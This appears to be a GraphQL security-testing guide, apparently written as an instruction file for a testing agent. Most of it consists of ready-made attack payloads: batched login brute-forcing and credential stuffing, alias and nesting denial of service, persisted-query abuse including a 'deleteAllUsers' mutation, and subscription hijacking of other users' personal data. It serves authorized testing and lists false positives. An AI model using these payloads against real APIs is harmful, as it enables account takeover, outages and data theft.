<graphql_advanced_guide>
<title>ADVANCED GRAPHQL SECURITY TESTING</title>

<critical>Beyond basic introspection, GraphQL APIs expose unique attack surfaces including batching attacks, alias-based DoS, nested query depth attacks, field suggestion exploitation, persisted query abuse, and subscription hijacking. These advanced techniques can bypass rate limits, cause denial of service, and leak sensitive data.</critical>

<scope>
- Batching attacks for rate limit bypass
- Alias-based denial of service
- Nested query depth attacks
- Field suggestion exploitation
- Persisted query abuse
- Subscription hijacking
- Directive injection
- Type confusion attacks
</scope>

<methodology>
1. Enumerate schema via introspection or field suggestions.
2. Test query complexity limits with nested queries.
3. Probe batching endpoints for rate limit bypass.
4. Analyze alias handling for DoS potential.
5. Test subscription security and authorization.
6. Explore persisted query mechanisms for abuse.
</methodology>

<batching_attacks>
<array_batching>
{% raw %}
# Query batching for rate limit bypass:

# Standard array batching:
POST /graphql
Content-Type: application/json

[
  {"query": "mutation { login(email:\"a@b.com\", pass:\"pass1\") { token } }"},
  {"query": "mutation { login(email:\"a@b.com\", pass:\"pass2\") { token } }"},
  {"query": "mutation { login(email:\"a@b.com\", pass:\"pass3\") { token } }"},
  {"query": "mutation { login(email:\"a@b.com\", pass:\"pass4\") { token } }"},
  {"query": "mutation { login(email:\"a@b.com\", pass:\"pass5\") { token } }"}
]

# Credential stuffing via batch:
[
  {"query": "mutation { login(email:\"user1@x.com\", pass:\"123456\") { success } }"},
  {"query": "mutation { login(email:\"user2@x.com\", pass:\"password\") { success } }"},
  {"query": "mutation { login(email:\"user3@x.com\", pass:\"qwerty\") { success } }"}
]

# Account enumeration via batch:
[
  {"query": "query { userExists(email:\"user1@x.com\") }"},
  {"query": "query { userExists(email:\"user2@x.com\") }"},
  {"query": "query { userExists(email:\"user3@x.com\") }"}
]
{% endraw %}
</array_batching>

<operation_batching>
{% raw %}
# Multiple operations in single query:

# Named operation batching:
query GetUsers {
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  user4: user(id: 4) { name email }
}

# Mixed query and mutation:
# Some implementations allow:
{
  users { name }
  createUser(input: {...}) { id }
}

# Fragment-based batching:
fragment UserData on User { name email role }
query {
  u1: user(id: 1) { ...UserData }
  u2: user(id: 2) { ...UserData }
  u3: user(id: 3) { ...UserData }
}
{% endraw %}
</operation_batching>
</batching_attacks>

<alias_dos>
<alias_multiplication>
{% raw %}
# Alias-based resource exhaustion:

# Simple alias multiplication:
query {
  a1: expensiveQuery { data }
  a2: expensiveQuery { data }
  a3: expensiveQuery { data }
  # ... repeat 100+ times
  a100: expensiveQuery { data }
}

# Aliased field access:
query {
  user(id: 1) {
    n1: name
    n2: name
    n3: name
    n4: name
    # ... many duplicates
  }
}

# Aliased with different arguments:
query {
  u1: user(id: 1) { name }
  u2: user(id: 2) { name }
  u3: user(id: 3) { name }
  # ... enumerate all users
}

# Expensive resolver multiplication:
query {
  s1: search(query: "a") { results { title } }
  s2: search(query: "b") { results { title } }
  s3: search(query: "c") { results { title } }
}
{% endraw %}
</alias_multiplication>

<alias_bypass>
{% raw %}
# Using aliases to bypass field-level restrictions:

# If a field is limited to once per query:
query {
  secretField1: sensitiveData { value }
  secretField2: sensitiveData { value }
}

# Bypassing field-level rate limits:
query {
  r1: resetPassword(email: "a@b.com") { success }
  r2: resetPassword(email: "c@d.com") { success }
}

# Alias naming to evade detection:
query {
  __secret: adminData { credentials }
  _hidden: adminData { apiKeys }
}
{% endraw %}
</alias_bypass>
</alias_dos>

<nested_query_depth>
<depth_attacks>
{% raw %}
# Nested query depth exploitation:

# Circular reference exploitation:
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}

# Self-referential types:
query {
  node(id: "xyz") {
    ... on Category {
      parent {
        parent {
          parent {
            name
          }
        }
      }
    }
  }
}

# Deep object graphs:
query {
  organization {
    departments {
      teams {
        members {
          projects {
            tasks {
              subtasks {
                assignee { name }
              }
            }
          }
        }
      }
    }
  }
}
{% endraw %}
</depth_attacks>

<complexity_exploitation>
{% raw %}
# Query complexity attacks:

# List field multiplication:
query {
  users(first: 1000) {
    posts(first: 1000) {
      comments(first: 1000) {
        replies(first: 1000) {
          author { name }
        }
      }
    }
  }
}
# Theoretical: 1000 * 1000 * 1000 * 1000 = 10^12 objects

# Width + Depth combination:
query {
  a: deepField { b: deepField { name } }
  c: deepField { d: deepField { name } }
  e: deepField { f: deepField { name } }
}

# Connection-based amplification:
query {
  users(first: 100) {
    edges {
      node {
        followers(first: 100) {
          edges {
            node { name }
          }
        }
      }
    }
  }
}
{% endraw %}
</complexity_exploitation>
</nested_query_depth>

<field_suggestion>
<suggestion_exploitation>
{% raw %}
# Field suggestion for schema discovery:

# Typo-based field discovery:
query { usrs { name } }
# Response: "Did you mean 'users'?"

# Similar field names:
query { user { pasword } }
# Response: "Did you mean 'password'?"

# Systematic probing:
query { user { admin_token } }
query { user { api_key } }
query { user { secret } }
query { user { credential } }
query { user { privateData } }
query { user { internalId } }

# Type discovery:
query { __type(name: "Secre") { name } }
# May suggest: "SecretData", "SecretConfig"

# Directive discovery:
query { user @depr { name } }
# May suggest: "@deprecated"
{% endraw %}
</suggestion_exploitation>

<introspection_alternatives>
{% raw %}
# Schema discovery without introspection:

# Partial introspection (if __schema blocked):
query { __type(name: "Query") { fields { name type { name } } } }
query { __type(name: "User") { fields { name } } }

# Error message mining:
# Send invalid queries and analyze error details
query { user { nonExistentField } }

# Documentation endpoints:
GET /graphql/schema
GET /graphql/docs
GET /graphql.schema.json
GET /api/graphql/schema.graphql

# GraphQL Playground/GraphiQL info:
# May expose schema documentation
{% endraw %}
</introspection_alternatives>
</field_suggestion>

<persisted_queries>
<persisted_query_abuse>
{% raw %}
# Persisted query exploitation:

# Automatic Persisted Queries (APQ):
POST /graphql
{
  "extensions": {
    "persistedQuery": {
      "version": 1,
      "sha256Hash": "abc123..."
    }
  }
}

# Hash collision/brute force:
# Try common query hashes
# Dictionary of known query hashes

# Registration abuse:
# If registration is open:
POST /graphql
{
  "query": "mutation { deleteAllUsers { count } }",
  "extensions": {
    "persistedQuery": {
      "version": 1,
      "sha256Hash": "attacker_controlled_hash"
    }
  }
}

# Cache poisoning:
# Register malicious query with legitimate hash
{% endraw %}
</persisted_query_abuse>

<query_whitelisting_bypass>
{% raw %}
# Bypassing persisted query restrictions:

# Without persisted query (if not enforced):
POST /graphql
{"query": "{ users { password } }"}

# Null/empty extensions:
POST /graphql
{
  "query": "{ maliciousQuery }",
  "extensions": {}
}

# Invalid version:
{
  "extensions": {
    "persistedQuery": {
      "version": 999,
      "sha256Hash": "..."
    }
  }
}

# Mixed mode exploitation:
# Some endpoints may not require persisted queries
GET /graphql?query={users{name}}
{% endraw %}
</query_whitelisting_bypass>
</persisted_queries>

<subscription_hijacking>
<subscription_attacks>
{% raw %}
# GraphQL subscription exploitation:

# WebSocket connection:
ws://target.com/graphql/subscriptions
wss://target.com/graphql

# Connection init payload:
{"type": "connection_init", "payload": {"Authorization": "Bearer token"}}

# Subscribe to unauthorized data:
{
  "type": "start",
  "id": "1",
  "payload": {
    "query": "subscription { adminNotifications { message secrets } }"
  }
}

# Subscribe to other users' data:
subscription {
  userUpdates(userId: "victim_id") {
    email
    phone
    ssn
  }
}

# Mass subscription DoS:
# Open many subscriptions simultaneously
for i in range(1000):
  subscribe("subscription { updates { data } }")
{% endraw %}
</subscription_attacks>

<subscription_auth_bypass>
{% raw %}
# Subscription authorization bypass:

# Missing auth on subscription:
# Query requires auth, subscription doesn't
subscription { sensitiveUpdates { data } }

# Token reuse:
# Use expired/revoked token for subscription
# Connection may persist after token revocation

# Cross-tenant subscriptions:
subscription {
  organizationUpdates(orgId: "other_org") {
    internalData
  }
}

# Subscription enumeration:
subscription { user(id: 1) { ... } }
subscription { user(id: 2) { ... } }
# Different users, same connection
{% endraw %}
</subscription_auth_bypass>
</subscription_hijacking>

<directive_injection>
<directive_attacks>
{% raw %}
# Directive-based attacks:

# Skip/Include manipulation:
query {
  user {
    publicData
    secretData @include(if: true)
  }
}

# Deprecated field access:
query {
  user {
    oldPassword @deprecated
  }
}

# Custom directive abuse:
query {
  user @auth(role: "admin") {
    adminPanel
  }
}

# Directive injection:
query {
  user @malicious(payload: "<script>") {
    name
  }
}

# Streaming/defer abuse:
query {
  slowQuery @stream {
    hugeDataset
  }
}
{% endraw %}
</directive_attacks>
</directive_injection>

<type_confusion>
<type_attacks>
{% raw %}
# Type confusion and union attacks:

# Interface exploitation:
query {
  node(id: "user_1") {
    ... on AdminUser {
      adminPrivileges
      masterKey
    }
  }
}

# Union type abuse:
query {
  search(query: "test") {
    ... on User { ssn }
    ... on Document { content }
    ... on Secret { value }
  }
}

# Polymorphic query confusion:
query {
  entities {
    __typename
    ... on PublicEntity { data }
    ... on PrivateEntity { secrets }
  }
}
{% endraw %}
</type_attacks>
</type_confusion>

<common_payloads>
{% raw %}
# Batching:
[{"query":"mutation{login(u:\"a\",p:\"1\"){t}}"},
 {"query":"mutation{login(u:\"a\",p:\"2\"){t}}"}]

# Alias DoS:
query{a1:exp{d} a2:exp{d} a3:exp{d} a4:exp{d} a5:exp{d}}

# Deep nesting:
{u{f{f{f{f{f{f{f{f{f{n}}}}}}}}}}}

# Field suggestion:
query{user{passwrd}} # typo for suggestion

# Subscription hijack:
subscription{userUpdates(userId:"victim"){data}}
{% endraw %}
</common_payloads>

<validation>
1. Demonstrate batching bypass of rate limits with multiple operations.
2. Show alias-based DoS causing measurable server impact.
3. Prove depth attack bypassing complexity limits.
4. Document field suggestion leaking schema information.
5. Provide subscription hijacking accessing unauthorized data.
</validation>

<false_positives>
- Query complexity analysis rejecting deep/wide queries
- Proper batching limits enforced
- Alias counting in rate limiting
- Disabled field suggestions
- Subscription authorization matching query authorization
- Persisted query enforcement without bypass
</false_positives>

<impact>
- Rate limit bypass enabling brute force attacks
- Denial of service through resource exhaustion
- Schema discovery when introspection disabled
- Unauthorized data access via subscriptions
- Cache poisoning through persisted queries
- Privilege escalation via type confusion
</impact>

<pro_tips>
1. Test batching even when array format is rejected.
2. Combine aliases with nesting for amplified impact.
3. Use field suggestions systematically for schema discovery.
4. Test subscriptions with different authentication states.
5. Check if persisted query registration is open.
6. Analyze error messages for schema information leakage.
7. Test directive injection on all fields.
8. Check union/interface types for hidden fields.
9. Monitor server response times for DoS impact.
10. Document query cost and complexity for report.
</pro_tips>

<remember>GraphQL's flexibility is also its weakness. The same features that enable efficient data fetching can be abused for attacks. Always test query complexity, batching, subscriptions, and schema exposure beyond basic introspection.</remember>
</graphql_advanced_guide>
